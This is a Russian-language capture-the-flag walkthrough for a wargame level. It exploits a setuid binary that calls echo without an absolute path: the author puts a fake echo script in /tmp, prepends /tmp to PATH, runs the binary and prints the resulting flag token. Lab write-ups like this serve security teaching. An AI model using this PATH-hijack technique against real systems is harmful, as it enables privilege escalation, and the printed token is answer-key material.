В этом уровне впервыфе появляется некий бинарный файл

```
ls -la
```
> ...\
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03\
...

Права rws означают, что данный банарный файл будет выполняться не с привилегиями пользователя, который ее запустил, а с привилегиями владельца файла.
Так как владельцем файла является flag03, вместо echo нужно выполнить getflag

С помощью трассировки вызовов библиотеки находим:
```
ltrace ./level03
```
>__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>\
getegid()                                                                                                     = 2003\
geteuid()                                                                                                     = 2003\
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                           = 0\
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                           = 0\
system("/usr/bin/env echo Exploit me"Exploit me\
 <unfinished ...>\
--- SIGCHLD (Child exited) ---\
<... system resumed> )                                                                                        = 0\
+++ exited (status 0) +++

Oткрыв файл в нем была найдена строка:

system("/usr/bin/env echo Exploit me"Exploit me\

Которая выполняет echo без абсолютного пути, следовталеьно этот бинарник можно подменить

Создаем файл echo с необходимым содержимым
```
echo '#!/bin/sh
/bin/getflag' > /tmp/echo
```
И делаем его исполняемым
```
chmod +x /tmp/echo
```

Добавляем в начало данный путь
```
export PATH=/tmp:$PATH
```

Получаем токен
```
./level03
```
> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

